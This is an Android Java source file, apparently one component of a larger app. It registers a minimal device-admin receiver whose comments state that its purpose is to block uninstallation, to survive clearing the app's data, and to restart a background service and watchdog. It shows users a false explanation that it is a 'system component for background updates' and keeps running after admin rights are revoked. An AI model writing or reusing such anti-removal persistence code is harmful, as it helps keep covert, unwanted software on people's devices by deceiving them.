package com.sys.core;

import android.app.admin.DeviceAdminReceiver;
import android.app.admin.DevicePolicyManager;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.widget.Toast;

/**
 * Device Admin minimo. Serve para tres coisas:
 *  - bloquear desinstalacao pela UI (Configuracoes exige "Desativar admin" antes)
 *  - sobreviver a "Limpar dados" (o admin fica registrado no sistema)
 *  - ganhar um gancho de reativacao em onEnabled
 *
 * Nao aplica politica nenhuma de verdade: nenhum wipe, nenhum lock forcado.
 */
public class Admin extends DeviceAdminReceiver {

    static ComponentName cn(Context c) {
        return new ComponentName(c, Admin.class);
    }

    static boolean isActive(Context c) {
        try {
            DevicePolicyManager d = (DevicePolicyManager) c.getSystemService(Context.DEVICE_POLICY_SERVICE);
            return d != null && d.isAdminActive(cn(c));
        } catch (Exception e) {
            return false;
        }
    }

    /** dispara o dialogo de ativacao; silencioso se ja ativo ou sem suporte */
    static void request(Context c) {
        try {
            if (isActive(c)) return;
            Intent i = new Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN);
            i.putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, cn(c));
            i.putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION,
                    "Componente de sistema para atualizacoes em segundo plano.");
            i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            c.startActivity(i);
        } catch (Exception ignored) {}
    }

    @Override public void onEnabled(Context c, Intent i) {
        MainActivity.startServiceCompat(c);
        Watchdog.schedule(c);
    }

    @Override public void onDisabled(Context c, Intent i) {
        // admin removido nao mata o app: o servico continua e o job reagenda
        Watchdog.schedule(c);
    }

    @Override public CharSequence onDisableRequested(Context c, Intent i) {
        return "Desativar remove a protecao contra desinstalacao. Continuar?";
    }

    @Override public void onPasswordChanged(Context c, Intent i) {
        MainActivity.startServiceCompat(c);
    }

    @Override public void onReceive(Context c, Intent i) {
        super.onReceive(c, i);
    }
}